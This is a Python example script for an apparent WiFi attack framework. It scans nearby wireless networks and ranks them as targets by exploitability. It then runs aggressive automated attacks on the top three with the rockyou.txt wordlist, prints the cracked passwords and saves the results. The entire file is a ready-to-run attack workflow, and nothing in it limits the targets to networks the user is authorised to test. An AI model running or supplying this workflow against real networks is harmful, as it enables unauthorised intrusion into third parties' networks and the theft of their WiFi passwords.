"""
Red WiFi Example: Automated Attack
Demonstrates complete attack workflow.
"""

from red_wifi import (
    WiFiPentestFramework,
    AutomatedAttacker,
    AttackMode,
    AttackStrategy
)


def main():
    """Run automated WiFi attack."""
    
    # Initialize framework
    print("Initializing Red WiFi Framework...")
    framework = WiFiPentestFramework("wlan0")  # Replace with your interface
    
    if not framework.initialize():
        print("Failed to initialize framework")
        return
    
    # Scan networks
    print("\nScanning for networks (30 seconds)...")
    networks = framework.scan_networks(duration=30)
    
    if not networks:
        print("No networks found!")
        return
    
    # Setup attacker
    print(f"\nFound {len(networks)} networks")
    attacker = AutomatedAttacker(framework)
    
    # Rank targets by exploitability
    ranked_targets = attacker.rank_targets(networks)
    
    print("\nTop Attack Targets:")
    for i, (target, score) in enumerate(ranked_targets[:5], 1):
        print(f"{i}. {target.ssid} ({target.bssid}) - Score: {score:.1f}")
    
    # Select top targets
    targets = [net for net, _ in ranked_targets[:3]]
    
    # Execute attacks
    print("\nLaunching attacks...")
    results = attacker.multi_target_attack(
        targets,
        mode=AttackMode.AGGRESSIVE,
        strategy=AttackStrategy.HYBRID,
        wordlist="rockyou.txt"  # Change to your wordlist path
    )
    
    # Display results
    print("\n" + "="*60)
    print("ATTACK RESULTS")
    print("="*60)
    
    for result in results:
        status = "SUCCESS" if result.success else "FAILED"
        print(f"\nTarget: {result.target.ssid}")
        print(f"BSSID: {result.target.bssid}")
        print(f"Status: {status}")
        print(f"Method: {result.method}")
        if result.password:
            print(f"Password: {result.password}")
        print(f"Duration: {result.duration:.2f}s")
    
    # Get statistics
    stats = attacker.get_statistics()
    print("\n" + "="*60)
    print("STATISTICS")
    print("="*60)
    print(f"Total Attacks: {stats.get('total_attacks', 0)}")
    print(f"Successful: {stats.get('successful', 0)}")
    print(f"Success Rate: {stats.get('success_rate', 0):.1f}%")
    print(f"Total Duration: {stats.get('total_duration', 0):.1f}s")
    print(f"Average Duration: {stats.get('average_duration', 0):.1f}s")
    
    # Save results
    print("\nSaving session...")
    framework.session_data['attack_results'] = results
    framework.save_session("automated_attack_session.json")
    
    print("Attack complete!")


if __name__ == "__main__":
    main()
